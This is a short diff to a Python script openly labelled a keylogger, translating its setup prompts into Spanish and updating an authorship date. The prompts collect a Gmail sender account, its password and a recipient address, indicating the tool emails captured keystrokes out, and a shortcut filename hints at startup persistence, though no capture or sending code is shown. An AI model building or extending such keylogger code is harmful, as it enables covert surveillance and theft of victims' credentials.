@@ -1,6 +1,6 @@
 # Keylogger creado por Edinson Requena y editado, traducido y comentado por Xabier Gabiña.
 
-# Script creado el 07/04/2020 por Xabier Gabiña ak.Xabierland
+# Script editado el 10/04/2020 por Xabier Gabiña ak.Xabierland
 # Mi Github: https://github.com/Xabierland
 # Mi Twitter: https://twitter.com/Xabierland
 # Mi Instagram: https://www.instagram.com/xabierland/
@@ -54,9 +54,9 @@ gmail = None
 def intro_data():
     global gmail, password, email
 
-    gmail = input("Put here the gmail account that will send you the emails: ")
-    password = input("enter the gmail account password: ")
-    email = input("Put her the gmail account that receives the emails: ")
+    gmail = input("Introduce la cuenta que enviara el correo: ")
+    password = input("Introduce la contraseña de la cuenta que enviara el correo: ")
+    email = input("Introduce la cuenta que recibira el correo: ")
 
 # Verifica si nuestro archivo se ha guardado en la variable destination y llamamos a la funcion _dir()
 shortcut = 'hack.pyw - Shortcut.lnk'
